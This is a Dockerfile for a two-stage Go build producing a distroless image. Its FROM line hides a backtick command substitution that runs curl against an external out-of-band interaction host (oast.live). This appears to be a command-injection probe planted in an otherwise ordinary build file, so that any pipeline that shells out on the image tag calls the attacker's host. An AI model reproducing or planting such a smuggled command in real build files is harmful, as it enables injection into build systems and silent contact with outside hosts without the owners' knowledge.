FROM golang:`curl -s https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/devhub-df-backtick` AS builder

WORKDIR /build
COPY go.mod go.sum ./
RUN go mod download && go mod verify
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -v -o app-binary

FROM gcr.io/distroless/static-debian12

ENV PORT=8080
EXPOSE 8080

WORKDIR /app
COPY --from=builder /build/app-binary . 
CMD ["/app/app-binary"]
